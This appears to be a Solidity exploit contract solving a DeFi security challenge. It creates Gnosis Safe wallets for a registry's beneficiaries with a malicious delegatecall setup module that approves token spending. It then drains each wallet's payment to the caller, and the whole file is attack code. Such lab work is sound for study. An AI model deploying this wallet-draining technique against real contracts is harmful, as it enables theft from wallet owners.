// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract BackdoorAttacker {
    uint256 public PAYMENT_AMOUNT = 10 ether;

    constructor(
        address[] memory _initialBeneficiaries,
        address _walletRegestry
    ) {
        DelegateCallbackAttack delegateCallback = new DelegateCallbackAttack();
        WalletRegistry walletRegistry = WalletRegistry(_walletRegestry);
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        IERC20 token = walletRegistry.token();

        for (uint8 i = 0; i < _initialBeneficiaries.length;) {
            address[] memory owners = new address[](1);
            owners[0] = _initialBeneficiaries[i];

            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(delegateCallback),
                abi.encodeWithSelector(
                    DelegateCallbackAttack.delegateCallback.selector,
                    address(token),
                    address(this),
                    PAYMENT_AMOUNT
                ),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                walletRegistry.masterCopy(),
                initializer,
                i,
                IProxyCreationCallback(_walletRegestry)
            );

            require(token.allowance(address(proxy), address(this)) == PAYMENT_AMOUNT, "insufficient allowance");
            token.transferFrom(address(proxy), msg.sender, PAYMENT_AMOUNT);
            unchecked {i++;}
        }
    }

}

contract DelegateCallbackAttack {
    function delegateCallback(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }
}
